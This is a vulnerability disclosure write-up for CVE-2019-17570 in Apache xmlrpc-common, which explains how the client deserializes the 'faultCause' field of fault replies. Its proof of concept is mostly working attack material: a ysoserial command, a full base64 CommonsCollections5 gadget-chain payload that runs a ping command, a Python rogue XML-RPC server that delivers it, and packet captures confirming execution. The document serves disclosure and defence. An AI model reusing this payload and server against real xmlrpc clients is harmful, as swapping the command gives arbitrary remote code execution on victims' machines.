# xmlrpc-common deserialization vulnerability

This note is a technical note to detail the root cause and the associated exploit. You can find the initial disclosure [here](https://www.openwall.com/lists/oss-security/2020/01/16/1). The associated CVE is CVE-2019-17570.

## Description

xmlrpc-common forms a shared code base between xmlrpc-client and xmlrpc-server. A deserialization vulnerability has been identified in `org.apache.xmlrpc.parser.XmlRpcResponseParser.addResult(Object)` method. It enables an attacker controlled xmlrpc server to send a malicious xmlrpc reply, that will trigger remote code execution in the xmlrpc client.

The deserialization is triggered by the use of xmlrpc faults, which may contain a `faultCause`. The content of this node is processed as a byte array, later deserialized to a Java object using `readObject()`:

```
protected void addResult(Object pResult) throws SAXException {
  if (isSuccess) {
    super.setResult(pResult);
  } else {
    Map map = (Map) pResult;
    Integer faultCode = (Integer) map.get("faultCode");
    if (faultCode == null) {
      throw new SAXParseException("Missing faultCode", getDocumentLocator());
    }
    try {
      errorCode = faultCode.intValue();
    } catch (NumberFormatException e) {
      throw new SAXParseException("Invalid faultCode: " + faultCode,
        getDocumentLocator());
    }
    errorMessage = (String) map.get("faultString");
    Object exception = map.get("faultCause");
    if (exception != null) {
      try {
        byte[] bytes = (byte[]) exception;
        ByteArrayInputStream bais = new ByteArrayInputStream(bytes);
        ObjectInputStream ois = new ObjectInputStream(bais);
        errorCause = (Throwable) ois.readObject();
        ois.close();
        bais.close();
      } catch (Throwable t) {
        // Ignore me
      }
    }
  }
}
```

The vulnerability is different from CVE-2016-5003, which exploits <ex:serialized> type to trigger deserialization. This new vulnerability affects xmlrpc-common even in its default configuration, with extension disabled.

## Exploitation technique

While the vulnerability is in `xmlrpc-common`, exploitation requires the use of a gadgets chain to gain remote code execution. The gadgets chain depends on the classes available in the classpath. For demonstation purposes, our proof-of-concept has added Apache commons-collections-3.2.1 in the classpath, and gadgets chain has been generated using ysoserial.

## CVSSv3 base score: 9.8

CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

## Impact(s)

An attacker may execute arbitrary code in the context of an xmlrpc client using xmlrpc-common vulnerable versions.

## Proof of concept

Our proof of concept employs a purposely written xmlrpc test client, and an attacker controlled xmlrpc server.

### xmlrpc server

The main purpose of this server is to deliver the serialized payload to the vulnerable client. The serialized payload has been created using:

```
$ java -jar ysoserial-0.0.6-SNAPSHOT-BETA-all.jar CommonsCollections5 "ping www.google.com" | base64
...
rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAA3NyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIACEIABmZvcm1hdEkACmxpbmVOdW1iZXJMAA9jbGFzc0xvYWRlck5hbWVxAH4ABUwADmRlY2xhcmluZ0NsYXNzcQB+AAVMAAhmaWxlTmFtZXEAfgAFTAAKbWV0aG9kTmFtZXEAfgAFTAAKbW9kdWxlTmFtZXEAfgAFTAANbW9kdWxlVmVyc2lvbnEAfgAFeHABAAAAU3QAA2FwcHQAJnlzb3NlcmlhbC5wYXlsb2Fkcy5Db21tb25zQ29sbGVjdGlvbnM1dAAYQ29tbW9uc0NvbGxlY3Rpb25zNS5qYXZhdAAJZ2V0T2JqZWN0cHBzcQB+AAsBAAAANXEAfgANcQB+AA5xAH4AD3EAfgAQcHBzcQB+AAsBAAAAInEAfgANdAAZeXNvc2VyaWFsLkdlbmVyYXRlUGF5bG9hZHQAFEdlbmVyYXRlUGF5bG9hZC5qYXZhdAAEbWFpbnBwc3IAH2phdmEudXRpbC5Db2xsZWN0aW9ucyRFbXB0eUxpc3R6uBe0PKee3gIAAHhweHNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXlxAH4AAUwAA21hcHQAD0xqYXZhL3V0aWwvTWFwO3hwdAADZm9vc3IAKm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5tYXAuTGF6eU1hcG7llIKeeRCUAwABTAAHZmFjdG9yeXQALExvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNoYWluZWRUcmFuc2Zvcm1lcjDHl+woepcEAgABWwANaVRyYW5zZm9ybWVyc3QALVtMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwdXIALVtMb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLlRyYW5zZm9ybWVyO71WKvHYNBiZAgAAeHAAAAAFc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5Db25zdGFudFRyYW5zZm9ybWVyWHaQEUECsZQCAAFMAAlpQ29uc3RhbnRxAH4AAXhwdnIAEWphdmEubGFuZy5SdW50aW1lAAAAAAAAAAAAAAB4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXEAfgAFWwALaVBhcmFtVHlwZXN0ABJbTGphdmEvbGFuZy9DbGFzczt4cHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJ0AApnZXRSdW50aW1ldXIAEltMamF2YS5sYW5nLkNsYXNzO6sW167LzVqZAgAAeHAAAAAAdAAJZ2V0TWV0aG9kdXEAfgAvAAAAAnZyABBqYXZhLmxhbmcuU3RyaW5noPCkOHo7s0ICAAB4cHZxAH4AL3NxAH4AKHVxAH4ALAAAAAJwdXEAfgAsAAAAAHQABmludm9rZXVxAH4ALwAAAAJ2cgAQamF2YS5sYW5nLk9iamVjdAAAAAAAAAAAAAAAeHB2cQB+ACxzcQB+ACh1cgATW0xqYXZhLmxhbmcuU3RyaW5nO63SVufpHXtHAgAAeHAAAAABdAATcGluZyB3d3cuZ29vZ2xlLmNvbXQABGV4ZWN1cQB+AC8AAAABcQB+ADRzcQB+ACRzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAAeHg=
```

The server itself is rather simple, and mainly consists in:

```python
def create_fault_deser(payload):
  return b'''<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <fault>
    <value>
      <struct>
        <member>
          <name>faultCode</name>
          <value><int>1337</int></value>
        </member>
        <member>
          <name>faultString</name>
          <value><string>You have been pwned</string></value>
        </member>
        <member>
          <name>faultCause</name>
          <value><base64>%s</base64></value>
        </member>
      </struct>
    </value>
  </fault>
</methodResponse>
''' % (payload)

class Handler(http.server.SimpleHTTPRequestHandler):
  def do_POST(self):
    self.send_response(200)
    self.send_header('Content-Type', 'text/xml')
    self.end_headers()

    self.wfile.write(create_fault_deser(PING_COMMONS_COLLECTIONS))

httpd = socketserver.TCPServer(('0.0.0.0', 8888), Handler)
httpd.serve_forever()
```

The `PING_COMMONS_COLLECTIONS` variable used above is set to the output of the ysoserial command.

### Test xmlrpc client

Our test client source is:

```java
package poc.xmlrpcdeser;

import java.net.MalformedURLException;
import java.net.URL;
import java.util.HashMap;
import java.util.Hashtable;
import org.apache.xmlrpc.XmlRpcException;
import org.apache.xmlrpc.client.XmlRpcClient;
import org.apache.xmlrpc.client.XmlRpcClientConfigImpl;

public class VulnerableClient {
    public static void main(String[] args) throws MalformedURLException, XmlRpcException {
        String domainName = "http://127.0.0.1:8888";

        String serverurl = domainName + "/RPC2";
        XmlRpcClientConfigImpl config = new XmlRpcClientConfigImpl();
        config.setServerURL(new URL(serverurl));
        XmlRpcClient client = new XmlRpcClient();
        client.setConfig(config);
        Object[] params = new Object[]{"test", "'tell me you are alive' 1337"};
        Object result = (Object) client.execute("xmlrpc-api", params);
    }
}
```

Once compile using `make`, trigger the code execution using:

```
$ java -jar target/VulnerableClient-1.0-SNAPSHOT-jar-with-dependencies.jar
```

### Proof

The malicious payload is delivered to the innocent victim:

```
$ ./xmlrpc-server.py
127.0.0.1 - - [redacted] "POST /RPC2 HTTP/1.1" 200 -
```

Our test client fails:

```
Exception in thread "main" org.apache.xmlrpc.XmlRpcException: You have been pwned
	at org.apache.xmlrpc.client.XmlRpcStreamTransport.readResponse(XmlRpcStreamTransport.java:205)
	at org.apache.xmlrpc.client.XmlRpcStreamTransport.sendRequest(XmlRpcStreamTransport.java:156)
	at org.apache.xmlrpc.client.XmlRpcHttpTransport.sendRequest(XmlRpcHttpTransport.java:143)
	at org.apache.xmlrpc.client.XmlRpcSunHttpTransport.sendRequest(XmlRpcSunHttpTransport.java:69)
	at org.apache.xmlrpc.client.XmlRpcClientWorker.execute(XmlRpcClientWorker.java:56)
	at org.apache.xmlrpc.client.XmlRpcClient.execute(XmlRpcClient.java:167)
	at org.apache.xmlrpc.client.XmlRpcClient.execute(XmlRpcClient.java:137)
	at org.apache.xmlrpc.client.XmlRpcClient.execute(XmlRpcClient.java:126)
	at poc.xmlrpcdeser.VulnerableClient.main(VulnerableClient.java:21)
Caused by: BadAttributeValueException: foo=1
	at ysoserial.payloads.CommonsCollections5.getObject(CommonsCollections5.java:83)
	at ysoserial.payloads.CommonsCollections5.getObject(CommonsCollections5.java:53)
	at ysoserial.GeneratePayload.main(GeneratePayload.java:34)
Caused by:
BadAttributeValueException: foo=1
	at ysoserial.payloads.CommonsCollections5.getObject(CommonsCollections5.java:83)
	at ysoserial.payloads.CommonsCollections5.getObject(CommonsCollections5.java:53)
	at ysoserial.GeneratePayload.main(GeneratePayload.java:34)
```

But the payload `ping www.google.com` is executed:

```
    1   0.000000    127.0.0.1 → 127.0.0.1    TCP 64 49378 → 8888 [SYN]
    3   0.000084    127.0.0.1 → 127.0.0.1    TCP 64 8888 → 49378 [SYN, ACK]
    5   0.000092    127.0.0.1 → 127.0.0.1    TCP 52 49378 → 8888 [ACK]
   11   0.001955    127.0.0.1 → 127.0.0.1    HTTP/XML 259 POST /RPC2 HTTP/1.1
   25   0.002905    127.0.0.1 → 127.0.0.1    HTTP/XML 52 HTTP/1.0 200 OK
   29   0.133997 192.168.1.14 → 216.58.198.196 ICMP 84 Echo (ping) request  id=0x1528, seq=0/0, ttl=64
   34   0.149668 216.58.198.196 → 192.168.1.14 ICMP 84 Echo (ping) reply    id=0x1528, seq=0/0, ttl=51 (request in 29)
   35   1.139284 192.168.1.14 → 216.58.198.196 ICMP 84 Echo (ping) request  id=0x1528, seq=1/256, ttl=64
   36   1.153082 216.58.198.196 → 192.168.1.14 ICMP 84 Echo (ping) reply    id=0x1528, seq=1/256, ttl=51 (request in 35)
```

Please note tshark output has been redacted not to display useless packets.

## Timeline

* 2019-11-19: Apache informed via email
* 2019-11-19: Apache XML-RPC is no longer actively maintained
* 2019-11-21: Red Hat informed via email
* 2019-11-22: Vulnerability reaffected to Apache project
* 2020-01-06: Distro OSS security informed via email
* 2020-01-16: Vulnerability published to OSS security mailing list
* 2020-01-24: Vulnerability details and proof of concept published on github.com

## Credits

* Guillaume TEISSIER (Orange)
* Orange group

## Affected versions

xmlrpc-common forms the base of xmlrpc, and only a few artifacts reference it. But taking a look at the users of xmlrpc client, we find 124 artifacts that embed xmlrpc-common transitively.

The vulnerability affects at least the following versions:

* [3.1.3-redhat-5](https://mvnrepository.com/artifact/org.apache.xmlrpc/xmlrpc-common/3.1.3-redhat-5)
* [3.1.3-redhat-2](https://mvnrepository.com/artifact/org.apache.xmlrpc/xmlrpc-common/3.1.3-redhat-2)
* [3.1.3-redhat-1](https://mvnrepository.com/artifact/org.apache.xmlrpc/xmlrpc-common/3.1.3-redhat-1)
* [3.1.3](https://mvnrepository.com/artifact/org.apache.xmlrpc/xmlrpc-common/3.1.3)
* [3.1.2](https://mvnrepository.com/artifact/org.apache.xmlrpc/xmlrpc-common/3.1.2)
* [3.1.1](https://mvnrepository.com/artifact/org.apache.xmlrpc/xmlrpc-common/3.1.1)
* [3.1](https://mvnrepository.com/artifact/org.apache.xmlrpc/xmlrpc-common/3.1)

The following versions are immune to this vulnerability, as they do not perform the lookup of `faultCause` in the received response:

* [3.0](https://mvnrepository.com/artifact/org.apache.xmlrpc/xmlrpc-common/3.0)
* [3.0rc1](https://mvnrepository.com/artifact/org.apache.xmlrpc/xmlrpc-common/3.0rc1)
* [3.0b1](https://mvnrepository.com/artifact/org.apache.xmlrpc/xmlrpc-common/3.0b1)


